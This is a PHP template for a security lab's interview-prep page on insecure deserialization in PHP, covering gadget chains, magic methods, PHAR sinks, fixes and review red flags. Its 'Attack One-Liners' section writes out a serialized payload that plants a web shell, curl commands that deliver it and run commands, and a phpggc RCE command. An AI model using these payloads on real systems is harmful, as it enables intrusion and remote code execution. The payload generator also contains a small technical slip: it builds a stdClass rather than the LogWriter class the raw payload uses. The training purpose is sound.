<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'Interview Prep — Insecure Deserialization (R3)';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div class="interview-hero">
      <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px;">
        <span class="badge badge-advanced">Advanced</span>
        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB R3 · INTERVIEW PREP</span>
      </div>
      <h1 style="margin:0 0 6px;">Insecure Deserialization</h1>
      <p style="color:var(--text-muted);font-size:0.9rem;margin:0;">PHP Object Injection via <code>unserialize()</code> on attacker-controlled data. OWASP A08 — a classic advanced AppSec interview topic.</p>
      <div style="margin-top:12px;">
        <a href="/rce_r3.php" class="btn btn-primary btn-sm">Back to Lab</a>
      </div>
    </div>

    <!-- 30-Second Answer -->
    <div class="interview-section">
      <h2>30-Second Answer</h2>
      <div class="thirty-sec">
        Insecure deserialization — specifically PHP Object Injection — occurs when attacker-controlled serialized data is passed to <code>unserialize()</code>. PHP reconstructs whatever object the attacker specifies, including objects whose magic methods (<code>__destruct</code>, <code>__wakeup</code>, <code>__toString</code>) execute code automatically at the end of the request. The attacker doesn't inject new code — they abuse classes that already exist in the application, chaining their side effects to write files, make HTTP requests, or execute OS commands.
      </div>
    </div>

    <!-- Common Qs -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q1">
        <label class="qa-question" for="q1">What is a gadget chain?</label>
        <div class="qa-answer">
          A <strong>gadget chain</strong> is a sequence of existing classes in the application (or its dependencies) whose magic methods chain together to achieve a dangerous side effect. Each "gadget" is a class whose magic method, when triggered, calls or instantiates the next class in the chain — ultimately reaching a primitive like <code>file_put_contents()</code>, <code>exec()</code>, or an HTTP request. The attacker doesn't need to upload new code — they craft a serialized payload that, when deserialized, builds this chain of objects. Real-world chains are found in frameworks like Laravel, Symfony, and Zend; tools like <strong>phpggc</strong> enumerate known gadgets.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q2">
        <label class="qa-question" for="q2">Which PHP magic methods are most commonly abused in deserialization?</label>
        <div class="qa-answer">
          <ul style="margin:0;padding-left:1.2em;">
            <li><code>__destruct()</code> — runs when the object is garbage collected (end of request). Most common entry point for file writes and RCE.</li>
            <li><code>__wakeup()</code> — runs immediately when <code>unserialize()</code> reconstructs the object. Used to trigger actions at deserialization time.</li>
            <li><code>__toString()</code> — runs when the object is cast to a string. If the deserialized object ends up in a string context (logging, output), this fires.</li>
            <li><code>__call()</code> — runs when an undefined method is called on the object. Used in proxy/delegation patterns to chain into other methods.</li>
            <li><code>__get()</code> / <code>__set()</code> — runs on property access, enabling chains through ORM or config objects.</li>
          </ul>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q3">
        <label class="qa-question" for="q3">How do you detect insecure deserialization?</label>
        <div class="qa-answer">
          <strong>Source code review:</strong> Grep for <code>unserialize(</code> and trace the source of the argument back to user-controlled inputs: cookies, POST body, query parameters, HTTP headers, database values that originated from user input.<br><br>
          <strong>Dynamic testing:</strong> Look for base64-encoded cookie or parameter values — PHP serialized strings start with <code>O:</code> (object) or <code>a:</code> (array) after decoding. Send a malformed payload and observe whether the server throws a deserialization error.<br><br>
          <strong>PHAR deserialization:</strong> Filesystem functions (<code>file_exists()</code>, <code>is_file()</code>, <code>fopen()</code>) trigger deserialization when called with a <code>phar://</code> URI — no explicit <code>unserialize()</code> needed. Any file path derived from user input may be exploitable this way.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q4">
        <label class="qa-question" for="q4">How do you fix insecure deserialization?</label>
        <div class="qa-answer">
          <ol style="margin:0;padding-left:1.2em;">
            <li><strong>Never deserialize untrusted data</strong> — this is the only complete fix.</li>
            <li><strong>Use JSON instead</strong> — <code>json_decode()</code> does not reconstruct PHP objects unless you pass <code>false</code> as the second argument, and even then it returns stdClass, not instances of arbitrary classes.</li>
            <li><strong>Allowlist permitted classes</strong> — <code>unserialize($data, ['allowed_classes' => ['UserPrefs']])</code> prevents reconstruction of gadget classes.</li>
            <li><strong>Sign serialized data with HMAC</strong> — verify the signature before deserializing; reject any tampered payload.</li>
            <li><strong>Keep dependencies minimal</strong> — fewer classes in the codebase means fewer available gadgets.</li>
          </ol>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q5">
        <label class="qa-question" for="q5">What is PHAR deserialization and why is it dangerous?</label>
        <div class="qa-answer">
          PHP Archive (PHAR) files embed serialized PHP metadata in their manifest. When PHP's stream wrapper processes a <code>phar://</code> URI, it deserializes this metadata automatically — even in functions you'd never expect to trigger deserialization: <code>file_exists()</code>, <code>is_dir()</code>, <code>fopen()</code>, <code>copy()</code>, <code>unlink()</code>, and many more. If any user-controlled string reaches one of these functions as a path, and the attacker can upload or otherwise place a malicious PHAR file on the server, deserialization (and thus gadget chain execution) occurs without a single explicit <code>unserialize()</code> call. This massively broadens the attack surface beyond obvious <code>unserialize()</code> sinks.
        </div>
      </div>
    </div>

    <!-- Dev Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="display:flex;flex-direction:column;gap:10px;font-size:0.875rem;color:var(--text-muted);">
        <div><strong style="color:var(--text);">Replace serialize/unserialize with JSON + HMAC.</strong> Store preferences as signed JSON: <code>base64(json_encode($prefs) . '.' . hmac(json_encode($prefs), SECRET_KEY))</code>. Verify signature before decoding.</div>
        <div><strong style="color:var(--text);">If unserialize is unavoidable</strong>, use the <code>allowed_classes</code> option: <code>unserialize($data, ['allowed_classes' => ['MyClass']])</code>. This prevents reconstruction of gadget classes outside your allowlist.</div>
        <div><strong style="color:var(--text);">Audit for PHAR sinks</strong> — search for file path operations that accept user input: <code>file_exists</code>, <code>include</code>, <code>SplFileInfo</code>. Ensure no user-controlled string reaches them without sanitization.</div>
        <div><strong style="color:var(--text);">Minimize autoloaded classes</strong> — every class available via autoloader is a potential gadget. Remove unused dependencies.</div>
      </div>
    </div>

    <!-- One-liners -->
    <div class="interview-section">
      <h2>Attack One-Liners</h2>
      <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:10px;">Raw PHP serialized payload for a <code>LogWriter</code> object (before base64 encoding):</p>
      <div class="oneliner">O:9:"LogWriter":2:{s:4:"file";s:29:"/var/www/html/uploads/pwn.php";s:4:"data";s:27:"&lt;?php system($_GET['c']);?&gt;";}</div>
      <p style="font-size:0.82rem;color:var(--text-muted);margin:10px 0 6px;">Generate payload in PHP:</p>
      <div class="oneliner">php -r '$o=new stdClass;$o->file="/var/www/html/uploads/pwn.php";$o->data="&lt;?php system(\$_GET[\"c\"]);?&gt;";echo base64_encode(serialize($o));'</div>
      <p style="font-size:0.82rem;color:var(--text-muted);margin:10px 0 6px;">Set cookie and trigger with curl:</p>
      <div class="oneliner">curl -b "prefs=BASE64PAYLOAD" http://target/rce_r3.php</div>
      <div class="oneliner">curl "http://target/uploads/pwn.php?c=cat+/flags/lab_r3.txt"</div>
      <p style="font-size:0.82rem;color:var(--text-muted);margin:10px 0 6px;">Using phpggc for framework gadget chains:</p>
      <div class="oneliner">phpggc Laravel/RCE1 system id | base64</div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Red Flags in Code Review</h2>
      <div class="red-flag-item">&#9888; <code>unserialize($_COOKIE[...])</code>, <code>unserialize($_POST[...])</code>, <code>unserialize($_GET[...])</code> — direct unserialization of user input</div>
      <div class="red-flag-item">&#9888; No <code>allowed_classes</code> parameter passed to <code>unserialize()</code></div>
      <div class="red-flag-item">&#9888; Classes with <code>__destruct()</code>, <code>__wakeup()</code>, or <code>__toString()</code> that perform file I/O or exec calls</div>
      <div class="red-flag-item">&#9888; Serialized data stored in cookies without integrity protection (HMAC/signature)</div>
      <div class="red-flag-item">&#9888; File path operations (<code>file_exists</code>, <code>include</code>) where path originates from user input — potential PHAR deserialization vector</div>
      <div class="red-flag-item">&#9888; Using <code>serialize()</code> for session tokens or auth tickets — encourages deserialization of untrusted data elsewhere</div>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
